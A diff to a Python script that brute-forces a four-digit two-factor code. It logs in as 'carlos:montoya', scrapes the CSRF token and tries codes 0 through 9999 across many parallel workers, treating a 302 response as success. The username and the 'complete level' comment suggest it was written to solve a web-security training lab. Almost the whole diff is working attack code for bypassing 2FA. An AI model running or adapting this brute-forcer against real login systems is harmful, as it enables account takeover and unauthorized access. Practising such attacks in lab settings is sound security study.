@@ -5,13 +5,14 @@ import multiprocessing
 # import numpy as np
 
 
-def Check_Second_Factor_Code(code_to_check):
-    if code_to_check == 302:
-        print(f'2fa valid with response code {code_to_check}')
-        sys.exit(0)
+def Check_Second_Factor_Code(web_response, factor_code):
+    if web_response == 302:
+        print(f'\n\n\n2fa valid with response code {web_response}')
+        print(f'2fa valid code: {factor_code}\n\n\n')
+        found_code.set()
         # Visit account profile page to complete level
     else:
-        print(f'2fa invalid with response code: {code_to_check}')
+        print(f'2fa invalid with response code: {web_response}')
 
 
 def Login_to_account(factor_code):
@@ -31,10 +32,10 @@ def Login_to_account(factor_code):
         'username': 'carlos',
         'password': 'montoya'
     }
-    print(f'Logging in as carlos:montoya')
+    # print(f'Logging in as carlos:montoya')
     print(f'Using 2FA code: {factor_code}')
     resp = s.post(login_url, data=logindata)
-    print(f'Login response: {resp.text}')
+    # print(f'Login response: {resp.text}')
 
     soup = BeautifulSoup(resp.text, 'html.parser')
     csrf = soup.find('input', {'name': 'csrf'}).get('value')
@@ -49,12 +50,12 @@ def Login_to_account(factor_code):
 
 
 if __name__ == '__main__':
-
+    # Event variable to set when found correct 2fa
+    found_code = multiprocessing.Event()
     # Generate a list of 0-9999
     factor_code_list = list(i for i in range(10000))
-    # Get a multiple of CPU Count going of workers, in my case 96
-    workers = multiprocessing.cpu_count() * 4
-    # workers = np.array_split(factor_code_list, workers)
-    print(factor_code_list)
+    # Get alot of workers.
+    workers = multiprocessing.cpu_count() * 20
+
     with multiprocessing.Pool(workers) as w:
         w.map(Login_to_account, factor_code_list)
